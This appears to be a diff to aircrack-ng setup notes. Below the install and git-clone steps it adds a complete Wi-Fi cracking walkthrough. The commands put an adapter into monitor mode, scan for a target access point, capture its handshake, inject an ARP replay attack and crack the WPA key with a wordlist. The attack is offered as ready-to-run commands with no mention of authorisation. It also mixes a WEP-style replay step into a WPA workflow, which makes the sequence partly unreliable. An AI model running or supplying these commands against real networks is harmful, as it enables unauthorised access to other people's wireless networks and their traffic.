@@ -70,3 +70,20 @@ summary
 $ sudo apt install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils
 $ git clone https://github.com/aircrack-ng/aircrack-ng
 $ cd aircrack-ng
+# kill all interfering processes prior to using the aircrack-ng
+airmon-ng check kill
+
+# put your network device into monitor mode
+airmon-ng start wlan0
+
+# listen for all nearby beacon frames to get target BSSID and channel
+airodump-ng mon0
+
+# start listening for the handshake on a new console session
+airodump-ng -c 10 --bssid 08:00:BF:E6:31:2E -w output-file mon0
+
+# start the ARP request replay attack
+aireplay-ng --arpreplay -b 08:00:BF:E6:31:2E -h 00:0F:35:51:AC:22 mon0
+
+# run aircrack-ng to obtain the WPA key
+aircrack-ng -a2 -b 08:00:BF:E6:31:2E -w wordlist.txt output*.cap
